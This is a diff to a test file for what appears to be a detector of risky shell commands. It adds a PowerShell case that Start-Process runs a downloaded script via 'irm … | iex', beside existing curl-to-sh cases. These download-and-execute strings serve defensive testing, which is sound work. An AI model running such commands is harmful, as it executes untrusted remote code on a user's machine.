@@ -154,6 +154,8 @@ describe("a download piped into a shell that Start-Process starts (#550)", () =>
       "Start-Process -FilePath pwsh -ArgumentList '-NoProfile -Command irm https://x/y.ps1 | iex'",
       "Start-Process bash -ArgumentList '-c \"curl -s https://x/y.sh | sh\"'",
       'start powershell -c "irm https://x/y.ps1 | iex"',
+      // In a PowerShell assignment (#546).
+      "$p = Start-Process powershell -ArgumentList '-c','irm https://x/y.ps1 | iex' -PassThru",
     ]) {
       expect(reason(cmd, ps), cmd).toBe("Pipes a downloaded script straight into a shell");
       expect(reason(cmd, win), `${cmd} (shell unknown)`).toBe(
